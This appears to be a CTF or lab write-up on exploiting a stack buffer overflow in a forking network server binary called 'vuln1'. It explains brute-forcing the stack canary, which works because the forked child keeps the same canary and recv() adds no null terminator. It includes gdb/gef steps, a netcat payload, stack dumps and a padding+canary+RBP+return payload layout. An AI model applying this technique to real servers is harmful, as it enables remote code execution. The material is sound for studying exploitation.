# Server Fork with recv() - vuln1

fork without execve() child process = canary does not change </br>
recv() = no null terminator '\x00' which makes canary bruteforce possible
```
gef➤  checksec
[+] checksec for 'vuln1'
Canary                        : Yes →  value: 0x4635cf1eaee08a00
NX                            : Yes
PIE                           : Yes
Fortify                       : No
RelRO                         : Partial
```
fork child process = canary does not change
recv() = no null terminator '\x00' which makes canary bruteforce possible

```
# nc 127.0.0.1 1337
Please enter the message you want to send to admin:
aaaaaaaaaaaaaaaaaaaaabbccc
Done.
```
'vuln1' uses libc.so.6 = libc leak, since the program returns after sending input
stripped = no symbol table, so no 'b main', use starti then set break point with ghidra reference
```
# file vuln1 
vuln1: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter 
/lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cc3b330cabc203d0d813e3114f1515b044a1fd4f,
 stripped

# ldd vuln1 
	linux-vdso.so.1 (0x00007ffc2df84000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd437426000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fd437603000)

```

starti, then check canary
Need to set detach-on-fork, and follow-fork-mode in order to debug child process


```
gef >

starti
set detach-on-fork off
set follow-fork-mode child
b *0x00005555555555e2
canary
c
```
[https://vagmour.eu/persistence-1/](https://vagmour.eu/persistence-1/)
[]()
[]()

Send Payload (python3):
```
payload = b'a' * 0x34 + b'cccc' 
netcat( '127.0.0.1', 1337 , payload , i  , []  )
```

After sending payload:  (  Canary = 0x4769534786267b00 ) </br>
RBP =  0x00007fffffffe0e0
```
$rax   : 0x39              
$rbx   : 0x0               
$rcx   : 0x00007ffff7ef444d  →  0x6b77fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fffffffe0b8  →  0x0000555555555562  →   mov eax, DWORD PTR [rbp-0x14]
$rbp   : 0x00007fffffffe0e0  →  0x00007fffffffe140  →  0x00005555555555f0  →   push r15
$rsi   : 0x00007fffffffe070  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
$rdi   : 0x4               
$rip   : 0x00005555555555e2  →   ret 
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x246             
$r12   : 0x0000555555555180  →   xor ebp, ebp
$r13   : 0x00007fffffffe220  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 

gef➤  x/20gx $rsi
0x7fffffffe070:	0x6161616161616161	0x6161616161616161
0x7fffffffe080:	0x6161616161616161	0x6161616161616161
0x7fffffffe090:	0x6161616161616161	0x6161616161616161
0x7fffffffe0a0:	0x6363636361616161	0x4769534786267b00
0x7fffffffe0b0:	0x00007fffffffe0e0	0x0000555555555562
0x7fffffffe0c0:	0x0000000000000002	0x0000000400000000
0x7fffffffe0d0:	0x0000000000000000	0x4769534786267b00
0x7fffffffe0e0:	0x00007fffffffe140	0x00005555555554cf
0x7fffffffe0f0:	0x00007fffffffe228	0x00000001f7e9d745
0x7fffffffe100:	0x0000000000000000	0x0000053900000010

```
![$rsi][stack1.jpg]

so payload = 

```
payload = b'a' * 0x34 + b'cccc' + CANARY + RBP + RETURN
```